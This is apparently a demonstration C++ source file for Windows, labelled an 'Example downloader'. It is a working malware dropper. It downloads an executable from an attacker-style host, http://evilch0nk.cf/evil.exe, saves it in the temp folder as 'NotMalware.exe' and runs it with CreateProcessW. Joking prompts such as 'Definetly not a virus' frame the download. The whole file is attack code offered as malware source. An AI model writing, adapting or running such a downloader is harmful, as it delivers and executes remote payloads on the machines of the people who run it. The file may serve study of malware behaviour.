#include <urlmon.h>
#include <windows.h>
#include <tchar.h>
#include <wininet.h>
#include <fileapi.h>
#include <shlwapi.h>
// Example downloader. 

int _tmain(){
    Sleep(5);
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    const wchar_t* URL = L"http://evilch0nk.cf/evil.exe";
    const wchar_t* malName= L"NotMalware.exe";
    wchar_t buffer[MAX_PATH ];
    PathCombineW(buffer, tempPath, malName );
    
    STARTUPINFO si;
	PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);

    MessageBoxW(NULL, L"Click me!", L"Definetly not a virus", MB_OK);
    DeleteUrlCacheEntryW(URL);
    //std::wcout << L"Downloading malware to " << buffer << std::endl;
    auto status = URLDownloadToFileW(NULL,URL, buffer, 0 , NULL );
    if (SUCCEEDED(status)){

        /*
                CreateProcessW(
        LPCWSTR               lpApplicationName,
        LPWSTR                lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL                  bInheritHandles,
        DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
        LPCWSTR               lpCurrentDirectory,
        LPSTARTUPINFOW        lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
        );
        */
       // we dont care about any of this for now, since we don't care about where this information gets directed 
       MessageBoxW(NULL, L"Infect your computer?", L"Definetly not a virus", MB_OK);
        if (!CreateProcessW(
            nullptr, (LPWSTR) buffer, nullptr, nullptr, FALSE, 0, nullptr, nullptr,  &si, &pi)){
        //    std::wcout << GetLastError() << std::endl;
            CloseHandle(pi.hProcess);
       
        }
        

    } else{
      //  std::wcout << L"Failed" << std::endl;
    }
    return 0; 
}